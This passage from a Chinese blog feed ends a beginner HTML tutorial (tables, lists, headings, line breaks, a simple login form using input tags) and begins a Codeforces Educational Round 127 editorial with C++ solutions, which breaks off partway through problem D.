class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        aaaaaaaaaaaaa</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        bbbbbbbb</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        cccccc</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        ddd</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到效果如下</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/7.png" alt="7"></p><h4 id="ul-ol"><a href="#ul-ol" class="headerlink" title="ul,ol"></a>ul,ol</h4><p>这俩是无序列表和有序列表，经常用 <code>markdown</code> 写博客的师傅对这个应该不会很陌生，我们来看看效果以及差异即可。</p><h5 id="demo-3"><a href="#demo-3" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>ddd<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>eee<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>fff<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>ggg<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>hhh<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/8.png" alt="8"></p><p>将代码中的 <code>ul</code> 换成 <code>ol</code> 之后呢，效果是这样的</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/9.png" alt="9"></p><h4 id="h1-h6"><a href="#h1-h6" class="headerlink" title="h1-h6"></a>h1-h6</h4><p>1-6级的标题。</p><h5 id="demo-4"><a href="#demo-4" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是一级标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>这是二级标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>这是三级标题<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h4</span>&gt;</span>这是四级标题<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h5</span>&gt;</span>这是五级标题<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h6</span>&gt;</span>这是六级标题<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/10.png" alt="10"></p><h4 id="br"><a href="#br" class="headerlink" title="br"></a>br</h4><p>换行标签，就跟我们 <code>C</code> 里面的 <code>\n</code> 一样一样的。</p><h5 id="demo-5"><a href="#demo-5" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            这是第一行</span><br><span class="line">            如果没有加br标签，这里还是第一行<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">            前面加了br标签，因此这里开始是第二行</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下，这个demo也是充分展现了，代码里换行仅仅只是为了好看，真的要换行还得这个标签出马。</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/11.png" alt="11"></p><p>到这里，常用的标签就讲完了。</p><h3 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h3><p>这个其实也算是非常常见的标签了，只不过它有点小复杂，因此单独拎出来讲讲。</p><p>这个主要用于收集表单用的控件，使用 <code>type</code> 属性指定它具体是哪一类控件，这些控件通常会在 <code>form</code> 标签内，指定 <code>form</code> 标签提交方式，当点击提交时便会将这个 <code>form</code> 标签上所有的用户输入提交到后端去。只是我们没有在后端写脚本响应这些数据，因此我们自己尝试的话点击通常是无效的。</p><p>常用的控件有以下几种</p><ul><li><code>text</code>：普通文本框</li><li><code>password</code>：密码框，与文本框一样只是输入内容会被和谐</li><li><code>textarea</code>：多行文本框</li><li><code>submit</code>：提交按钮</li><li><code>radio</code>：单选框</li><li><code>checkbox</code>：复选框</li><li><code>select</code>：下拉框</li></ul><p>这个我们不一一讲解了，直接一起聚合起来试试吧。</p><p>我们复刻一个最基本的登录前端</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">                用户名<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">                密码<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">                身份：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;user&quot;</span>/&gt;</span>管理员</span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span>/&gt;</span>用户</span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;guest&quot;</span>&gt;</span>游客<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;login&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;keep&quot;</span> <span class="attr">value</span>=<span class="string">&quot;remember&quot;</span>&gt;</span>记住密码</span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/12.png" alt="12"></p><p>可以发现 <code>input</code> 标签都设置了三个值，第一个我们说过了指定控件类型，第二个和第三个是什么呢。</p><p><code>name</code>其实就是参数名，这个<code>value</code>呢就是参数值了，<code>form</code> 标签有一个属性指定的是提交表单的方式，如果没有指定默认以 <code>get</code> 方式提交，<code>get</code> 方式我们很清楚一点就是数据在 <code>url</code> 中都是可以看到的的。那么我们随便输入点击提交看看会发生什么。</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/13.png" alt="13"></p><p>从 <code>url</code> 中也能很清楚的看到刚刚说的这一点，只是这种提交方式已经很少见了，大家也能看到，输入的数据基本就是明文传输的，现在网络安全也是国家高度重视的，稍微大一点的网站基本都是自己写提交方法然后然后 <code>js</code> 绑定控件去执行事件，这样就能在 <code>js</code> 里写加解密方法了。</p><p>就这么多吧，html学到这里差不多能弄清楚一点了。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> html </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>educational codeforces round 127(Div.2)</title>
      <link href="/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/"/>
      <url>/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/</url>
      
        <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1671">Educational Codeforces Round 127 (Rated for Div. 2)</a>，咕了有点久了，现在开写题解。</p><span id="more"></span><h2 id="A-String-Building"><a href="#A-String-Building" class="headerlink" title="A. String Building"></a>A. String Building</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>分析字符串是否能由aa,aaa,bb,bbb组成，给定字符串只含有a和b，很简单，就看看有没有单独存在的a或者b即可</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100005</span>]; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    s[len++]=<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==s[i<span class="number">-1</span>])&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(ans==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            ans=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Consecutive-Points-Segment"><a href="#B-Consecutive-Points-Segment" class="headerlink" title="B. Consecutive Points Segment"></a>B. Consecutive Points Segment</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>在数轴上放若干个点，每个点可以左移或者右移一个单位，或者不移，判断最后所有点能否在整数集合内连续。只考虑最左边和最右边的点，不难发现，若能连续，则满足a[n]-a[1]=n-1，我们就看最外两个点能否达到这个约束。若左边点右移，右边点左移则可以使得间距缩小2，因此若原本距离超过了n+1则一定不行。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>]; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d %d\n&quot;,a[n]-a[1],n);</span></span><br><span class="line">    <span class="keyword">if</span>(a[n]-a[<span class="number">1</span>]&gt;n+<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Dolce-Vita"><a href="#C-Dolce-Vita" class="headerlink" title="C. Dolce Vita"></a>C. Dolce Vita</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题很有意思。给你n个商店和每天 $k$ 枚金币，每个商店只每天卖一个糖果包，每天涨价一块。问经过很多天后你最多能买到多少，并且它告诉你了最后一定有一天你一个糖果包也买不了。</p><p>首先不难得出，我肯定要从最小的糖果开始买买到不能买为止才是最优的解。因此先排个序肯定没错，然后求出前缀和 $sum[i]$表示买 $i$ 个糖果的最小花费。这里因为天数不确定很可能要过超过 $10^9$ 天，因此我们不能从天数上循环，我们就推从能买 $i$ 个物品到 $i-1$ 个物品过了多少天，假设过了 $q$ 天，那么这几天的收益就是 $q*i$。</p><p>那么假设今天是x天，我能买j件物品，我们能持续买j件物品的天数就是 $ceil((double)(x-sum[j])/j-i)+!((x-sum[j])%j)$。推出表达式之后其实整个程序也就不难写了，先二分出第0天的位置然后往前一件一件数即可，最后不要忘了开 $long\ long$，可恶，没准我开了就蓝名了。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="keyword">int</span> sum[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    sum[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        sum[i]=sum[i<span class="number">-1</span>]+a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="built_in">upper_bound</span>(sum,sum+<span class="number">1</span>+n,x)-sum<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;I can choose %d pack\n&quot;,cnt);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=cnt;j&gt;=<span class="number">1</span>;j--)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;today is %d-th day\n&quot;,i);</span></span><br><span class="line">        <span class="keyword">int</span> after= <span class="built_in">ceil</span>((<span class="keyword">double</span>)(x-sum[j])/j-i)+!((x-sum[j])%j);</span><br><span class="line">        i+=after;</span><br><span class="line">        <span class="comment">//printf(&quot;I can buy until %d\n&quot;,i);</span></span><br><span class="line">        ans+=j*after;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Insert-a-Progression"><a href="#D-Insert-a-Progression" class="headerlink" title="D. Insert a Progression"></a>D. Insert a Progression</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>在数列中插入x个数，使得 $\sum <em>{i=1}^{n+x-1}|a_i^{‘}-a</em>{i-1}^{‘}|$ 最小。不难发现如果我插入的数在两个数之间，那么插入这个数对结果没有影响。若数列的最小值和最大值包括的部分那些数插入中间对答案没有影响，若剩余其它数则插在两边，至于插在哪边可以min一下。</p><p>这里当时看错题目了，以为每个数之间只能插入一次吗，导致后面卡了很长时间。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> max_x=a[<span class="number">1</span>],min_x=a[<span class="number">1</span>],ans=<span class="number">0</span>;</span><br><span class="line">    <span 